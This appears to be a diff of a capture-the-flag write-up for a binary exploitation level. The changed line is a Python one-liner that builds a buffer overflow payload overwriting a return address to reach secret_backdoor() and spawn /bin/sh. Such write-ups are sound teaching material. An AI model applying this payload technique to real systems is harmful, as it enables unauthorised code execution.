@@ -27,7 +27,7 @@ The buffer starts in `rbp - 0xc0 (192)` and there is a single `push rbp` (8), th
 
 All that is left is to get the address for `secret_backdoor()` and write our command:		
 ```bash
-python -c "print 40 * 'a' + '\xd4' + '\n' + 'a' * 200 + '\x00\x00\x55\x55\x55\x55\x48\x8c'[::-1] + '\n/bin/sh'" > /tmp/inj09
+python -c "print 40 * 'a' + '\xd4' + '\n' + 'a' * 200 + '\x00\x00\x55\x55\x55\x55\x48\x8c'[::-1] + '/bin/sh'" > /tmp/inj09
 level09@OverRide:~$ cat /tmp/inj09 - | ./level09
 --------------------------------------------
 |   ~Welcome to l33t-m$n ~    v1337        |
